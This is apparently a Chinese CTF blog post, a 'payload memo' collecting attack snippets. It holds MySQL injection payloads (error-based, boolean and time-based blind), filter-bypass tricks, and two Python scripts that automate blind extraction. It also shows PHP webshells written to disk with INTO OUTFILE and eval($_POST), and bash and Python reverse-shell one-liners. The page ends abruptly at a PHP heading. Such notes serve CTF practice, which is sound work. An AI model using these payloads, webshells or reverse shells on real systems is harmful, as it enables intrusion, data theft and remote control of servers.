<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="CTF,">










<meta name="description" content="sql注入mysql基础查询操作查数据库 1select group_concat(schema_name) from information_schema.schemata  查表名 1select group_concat(table_name) from information_schema.tables where table_schema=database()  查列名 1select">
<meta name="keywords" content="CTF">
<meta property="og:type" content="article">
<meta property="og:title" content="payload备忘">
<meta property="og:url" content="http://yoursite.com/2019/07/07/payload备忘/index.html">
<meta property="og:site_name" content="Moyu&#39;s blog">
<meta property="og:description" content="sql注入mysql基础查询操作查数据库 1select group_concat(schema_name) from information_schema.schemata  查表名 1select group_concat(table_name) from information_schema.tables where table_schema=database()  查列名 1select">
<meta property="og:locale" content="default">
<meta property="og:updated_time" content="2019-07-07T04:45:58.209Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="payload备忘">
<meta name="twitter:description" content="sql注入mysql基础查询操作查数据库 1select group_concat(schema_name) from information_schema.schemata  查表名 1select group_concat(table_name) from information_schema.tables where table_schema=database()  查列名 1select">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2019/07/07/payload备忘/">





  <title>payload备忘 | Moyu's blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Moyu's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            About
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            Archives
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/07/payload备忘/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Moyu">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/wlp.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Moyu's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">payload备忘</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-07T12:45:34+08:00">
                2019-07-07
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  5.2k
                </span>
              

              

              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><h4 id="基础查询操作"><a href="#基础查询操作" class="headerlink" title="基础查询操作"></a>基础查询操作</h4><p>查数据库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(schema_name) from information_schema.schemata</span><br></pre></td></tr></table></figure>

<p>查表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(table_name) from information_schema.tables where table_schema=database()</span><br></pre></td></tr></table></figure>

<p>查列名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(column_name) from information_schema.columns where table_name=tablename</span><br></pre></td></tr></table></figure>

<p>查字段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(属性) from 库.表</span><br></pre></td></tr></table></figure>

<p>读文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT load_file(&apos;/etc/passwd&apos;)</span><br></pre></td></tr></table></figure>

<p>写文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &lt;?php @eval($_POST[1]);?&gt; into outfile &apos;/var/www/html/shell.php&apos;</span><br></pre></td></tr></table></figure>

<p>sqlmap命令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 直接打url</span><br><span class="line">sqlmap -u url --level=3 --dbs --tables --columns --dump</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>从抓的包里获取</span><br><span class="line">sqlmap -r REQUESTFILE -D DB -T TBL -C COL</span><br></pre></td></tr></table></figure>

<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>常用系统函数</p>
<ul>
<li>version()：MYSQL版本</li>
<li>user()：数据库用户名</li>
<li>database()：数据库名</li>
<li>@@datadir：数据库路径</li>
<li>@@version_compile_os：操作系统版本</li>
</ul>
<p>字符串拼接</p>
<ul>
<li>concat()：没有分隔符地连接字符串</li>
<li>concat_ws()：含分隔符地连接字符串</li>
<li>group_cocnat()：连接一组的所有字符串并用’’,’’分开</li>
</ul>
<p>sql中and优先级大于or</p>
<p>让信息通过错误提示回显出来</p>
<h5 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;</span><br><span class="line"># count(*)，floor，group by 三者缺一不可</span><br></pre></td></tr></table></figure>

<p>原理解释</p>
<p>1.查询前默认会建立空虚拟表。</p>
<p>2.取第一条记录，执行floor(rand(0)*2)，发现结果为0(第一次计算),查询虚拟表，发现0的键值不存在，则floor(rand(0)*2)会被再计算一次，结果为1(第二次计算)，插入虚表，这时第一条记录</p>
<p>3.查询第二条记录，再次计算floor(rand(0)*2)，发现结果为1(第三次计算)，查询虚表，发现1的键值存在，所以floor(rand(0)*2)不会被计算第二次，直接count(*)加1，第二条记录查询完毕查询完毕</p>
<p>4.查询第三条记录，再次计算floor(rand(0)*2)，发现结果为0(第4次计算)，查询虚表，发现键值没有0，则数据库尝试插入一条新的数据，在插入数据时floor(rand(0)*2)被再次计算，作为虚表的主键，其值为1(第5次计算)，然而1这个主键已经存在于虚拟表中，而新计算的值也为1(主键键值必须唯一)，所以插入的时候就直接报错了</p>
<p>整个查询过程floor(rand(0)*2)被计算了5次，查询原数据表3次，所以这就是为什么数据表中需要3条数据，使用该语句才会报错的原因。</p>
<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select exp(~(select * from(select user())a))</span><br></pre></td></tr></table></figure>

<p>这个我在本地并没有试成功，可能是版本问题，需要版本在5.5.5及以上，但我5.5.53也没有打出来</p>
<h5 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and extractvalue(1,concat(0x3a,(select database()),0x3a))</span><br></pre></td></tr></table></figure>

<p>extractvalue(目标xml文档，xml路径)</p>
<p>以’:’开头的内容不是xml格式的语法，所以会报错</p>
<h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and updatexml(1,concat(0x3a,(select database()),0x3a),1)</span><br></pre></td></tr></table></figure>

<p>updatexml(目标xml文档，xml路径，更新的内容)</p>
<h5 id="NAME-CONST"><a href="#NAME-CONST" class="headerlink" title="NAME_CONST"></a>NAME_CONST</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))a</span><br></pre></td></tr></table></figure>

<p>mysql列名重复会报错</p>
<h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><p>盲注二分法脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://127.0.0.1/515/level3.php"</span></span><br><span class="line"></span><br><span class="line">temp = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    print(<span class="string">"round:"</span>+str(i))</span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = <span class="number">126</span></span><br><span class="line">    <span class="keyword">while</span>(low&lt;=high):</span><br><span class="line">        mid = (low+high)/<span class="number">2</span></span><br><span class="line">        table = <span class="string">"select group_concat(table_name) from information_schema.tables where table_schema='nex2019'"</span></span><br><span class="line">        column = <span class="string">"select group_concat(column_name) from information_schema.columns where table_name='f11la44ggg'"</span></span><br><span class="line">        flag = <span class="string">"select group_concat(F1aaag) from nex2019.f11la44ggg"</span></span><br><span class="line">        payload = <span class="string">"1' and (ascii(substr(("</span>+table+<span class="string">"),"</span>+str(i)+<span class="string">",1)))&gt;"</span>+str(mid)+<span class="string">"#"</span></span><br><span class="line">        data = &#123;<span class="string">'id'</span>:payload&#125;</span><br><span class="line">        result = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">"something happened"</span> <span class="keyword">in</span> result.text):</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid<span class="number">-1</span></span><br><span class="line">        </span><br><span class="line">    temp = temp + chr(int(round((low+high+<span class="number">1</span>)/<span class="number">2</span>)))</span><br><span class="line">    print(temp.ljust(<span class="number">32</span>, <span class="string">'*'</span>))</span><br></pre></td></tr></table></figure>

<h5 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><p>相关系统函数</p>
<ul>
<li>left(a,b)：从左取a的前b位</li>
<li>ascii()：将某个字符转换为ASCII码值</li>
<li>substr(a,b,c)：从b开始，截取a的c长度</li>
<li>ord()：将字符转换为ASCII码值</li>
<li>mid(a,b,c)：从b开始截取a的c位</li>
<li>regexp/like：正则匹配</li>
<li>POSITION</li>
</ul>
<h5 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h5><p>基本payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and (select case when (select ord(substring(flag from 1 for 1)) from flag limit 1) = 2 then sleep(5) else 1 end) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>

<h6 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sleep(5)</span><br></pre></td></tr></table></figure>

<h6 id="BENCHMARK"><a href="#BENCHMARK" class="headerlink" title="BENCHMARK"></a>BENCHMARK</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select benchmark(1000000,sha(1))</span><br></pre></td></tr></table></figure>

<h6 id="笛卡尔积"><a href="#笛卡尔积" class="headerlink" title="笛卡尔积"></a>笛卡尔积</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from information_schema.columns A, information_schema.columns B, information_schema.tables C</span><br></pre></td></tr></table></figure>

<h6 id="GET-LOCK"><a href="#GET-LOCK" class="headerlink" title="GET_LOCK"></a>GET_LOCK</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#session 1</span><br><span class="line">select get_lock(&apos;test&apos;,1)</span><br><span class="line"></span><br><span class="line">#session 2</span><br><span class="line">select get_lock(&apos;test&apos;,5)</span><br></pre></td></tr></table></figure>

<h6 id="rpad-repeat"><a href="#rpad-repeat" class="headerlink" title="rpad/repeat"></a>rpad/repeat</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select rpad(&apos;a&apos;,4999999,&apos;a&apos;) RLIKE concat(repeat(&apos;(a.*)+&apos;,30),&apos;b&apos;)</span><br></pre></td></tr></table></figure>

<p>通过<code>rpad</code>或<code>repeat</code>构造长字符串，加以计算量大的pattern，通过repeat的参数可以控制延时长短</p>
<h4 id="bypass技巧"><a href="#bypass技巧" class="headerlink" title="bypass技巧"></a>bypass技巧</h4><h5 id="禁用information-schema"><a href="#禁用information-schema" class="headerlink" title="禁用information_schema"></a>禁用information_schema</h5><p>mysql 5.6.X起，新增了<code>innodb_index_stats</code>和<code>innodb_table_stats</code>两个表</p>
<p>其中<code>innodb_index_stats</code>存储的是innodb引擎的库名,表名及其对应的索引名称.<code>innodb_table_stats</code>存储的是innodb引擎的库名和表名,</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(table_name) from mysql.innodb_table_stats where database_name=database()</span><br></pre></td></tr></table></figure>

<h5 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h5><ul>
<li><p>不使用占位符 %\</p>
</li>
<li><p>使用占位符 admin%1$\‘</p>
</li>
<li><p>对%c利用</p>
<p>&lt;? php<br>$input1 = ‘%1$c) OR 1 = 1 /*’ ;<br>$input2 = 39 ;<br>$sql = “SELECT * FROM foo WHERE bar IN (‘ $input1 ‘) AND baz = %s” ;<br>$sql = sprintf ( $sql , $input2 );</p>
</li>
</ul>
<h5 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h5><ul>
<li>%01-%0D特殊字符绕空格 或tab</li>
<li>&amp;= 在浏览器Url时要进行URL编码 %26 %3d</li>
<li>查询字符串中不允许有空格，可用%20,+对其编码</li>
<li>Cookie注入时，SQL语句中的分号得编码</li>
<li>16进制编码</li>
</ul>
<h5 id="未知字段名"><a href="#未知字段名" class="headerlink" title="未知字段名"></a>未知字段名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from (select 1)a,(select 2)b,(select 3)c union select * from users;</span><br></pre></td></tr></table></figure>

<h5 id="花式布尔条件"><a href="#花式布尔条件" class="headerlink" title="花式布尔条件"></a>花式布尔条件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">//正常情况</span><br><span class="line">&apos;or bool#</span><br><span class="line">true&apos;and bool#</span><br><span class="line">    </span><br><span class="line">//不使用空格、注释</span><br><span class="line">&apos;or(bool)=&apos;1</span><br><span class="line">true&apos;and(bool)=&apos;1</span><br><span class="line">    </span><br><span class="line">//不使用or、and、注释</span><br><span class="line">&apos;^!(bool)=&apos;1</span><br><span class="line">&apos;=(bool)=&apos;</span><br><span class="line">&apos;||(bool)=&apos;1</span><br><span class="line">true&apos;%26%26(bool)=&apos;1</span><br><span class="line">&apos;=if((bool),1,0)=&apos;0</span><br><span class="line">    </span><br><span class="line">//不使用等号、空格、注释</span><br><span class="line">&apos;or(bool)&lt;&gt;&apos;0</span><br><span class="line">&apos;or((bool)in(1))or&apos;0</span><br><span class="line">    </span><br><span class="line">//其他</span><br><span class="line">or (case when (bool) then 1 else 0 end)</span><br></pre></td></tr></table></figure>

<p>异或构造</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;^(ascii(mid((password)from(i)for(1)))&gt;j)^&apos;1&apos;=&apos;1&apos; #</span><br></pre></td></tr></table></figure>

<p>pow函数数值溢出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select if(1,1,pow(2,222222222222)); //条件为真，返回1</span><br><span class="line">select if(0,1,pow(2,222222222222)); //条件为假，报错</span><br></pre></td></tr></table></figure>

<h5 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select * from (select 1) a join (select 2) b #</span><br></pre></td></tr></table></figure>

<p>-1’ union select 1,(hex(substr((select F1aag from nex2019.f11la44ggg),1,8))),3 #</p>
<h5 id="过滤select"><a href="#过滤select" class="headerlink" title="过滤select"></a>过滤select</h5><p>堆叠查询+预加载</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> @s = <span class="keyword">CONCAT</span>(<span class="string">"sel"</span>,<span class="string">"ect database()"</span>);<span class="keyword">PREPARE</span> stmt1 <span class="keyword">FROM</span> @s;<span class="keyword">EXECUTE</span> stmt1;<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h5 id="未知表名、不能使用逗号、不能截断的时间盲注绕过"><a href="#未知表名、不能使用逗号、不能截断的时间盲注绕过" class="headerlink" title="未知表名、不能使用逗号、不能截断的时间盲注绕过"></a>未知表名、不能使用逗号、不能截断的时间盲注绕过</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">url=<span class="string">'http://10.66.20.180:3002/article.php'</span></span><br><span class="line">tables_count_num = <span class="number">0</span></span><br><span class="line">strings = <span class="string">"qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@!#$%*().&lt;&gt;1234567890&#123;&#125;"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_content</span><span class="params">(url)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">50</span>):</span><br><span class="line">            <span class="comment"># payload = "1 and ((SELECT length(user) from admin limit 1)="+str(i)+") and (sleep(2))"</span></span><br><span class="line">            <span class="comment"># payload = "(select case when ((SELECT length(t.2) from (select 1,2,3,4 union select * from flag) limit "+str(j)+") &gt;"+str(i)+") then 0 else sleep(2) end)"</span></span><br><span class="line">            payload = <span class="string">"(select case when ((SELECT length(t.4) from (select * from((select 1)a join(select 2)b join (select 3)c join (select 4)d) union/**/select * from flag) as t limit 1 offset 1) ="</span>+str(i)+<span class="string">") then sleep(2) else 0 end)"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> get_data(payload):</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"[*] content_length: "</span>+str(i)</span><br><span class="line">                content_length = i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    content = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">    tmp_content = <span class="string">""</span>    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,content_length+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> strings:</span><br><span class="line">            tmp_content = content+str(k)</span><br><span class="line">            tmp_content = tmp_content.ljust(content_length,<span class="string">'_'</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># payload = "1 and (SELECT ascii(mid(((SELECT user from admin limit 1))from("+str(i)+")))="+str(k+1)+") and (sleep(2))"</span></span><br><span class="line">            payload = <span class="string">"(select case when ((SELECT t.4 from (select * from((select 1)a join(select 2)b join (select 3)c join (select 4)d) union/**/select * from flag) as t limit 1 offset 1) like '"</span>+tmp_content+<span class="string">"') then sleep(2) else 0 end)"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment"># print payload</span></span><br><span class="line">            <span class="keyword">if</span> get_data(payload):</span><br><span class="line">                content += k</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"[*] content: "</span>+content</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] content: "</span> + content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_response</span><span class="params">(payload)</span>:</span></span><br><span class="line"></span><br><span class="line">    s = requests.Session()</span><br><span class="line">    username = <span class="string">"teststeststests1234\\"</span></span><br><span class="line"></span><br><span class="line">    s.post()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span><span class="params">(payload)</span>:</span></span><br><span class="line"></span><br><span class="line">    u = url+<span class="string">'?id='</span>+payload</span><br><span class="line">    <span class="keyword">print</span> u</span><br><span class="line">    otime = time.time()</span><br><span class="line">    <span class="comment"># print u.replace(' ','%20')</span></span><br><span class="line"></span><br><span class="line">    r = s.get(u)</span><br><span class="line">    rr = r.text</span><br><span class="line">    ptime = time.time()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ptime-otime &gt;<span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get_content(url)</span><br></pre></td></tr></table></figure>

<h3 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#创建</span><br><span class="line">CREATE TABLE a (cmd text NOT NULL);</span><br><span class="line">#写入</span><br><span class="line">INSERT INTO a (cmd) VALUES(&apos;&lt;?php eval($_POST[&apos;password&apos;]);?&gt;&apos;);</span><br><span class="line">#导出</span><br><span class="line">SELECT cmd from a into outfile &apos;/var/www/tmp/webshell.php&apos;;</span><br><span class="line">#删除</span><br><span class="line">Drop TABLE IF EXISTS a;</span><br><span class="line"></span><br><span class="line">1&apos; union select 1,&apos;&lt;?php eval($_POST[a]);?&gt;&apos; INTO OUTFILE &apos;/var/www/tmp/nb.php&apos;#</span><br></pre></td></tr></table></figure>

<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><blockquote>
<p>bash -i &gt;&amp; /dev/tcp/{ip}/{port} 0&gt;&amp;1</p>
</blockquote>
<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><blockquote>
<p>python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“ip”,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’</p>
</blockquote>
<h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><blockquote>
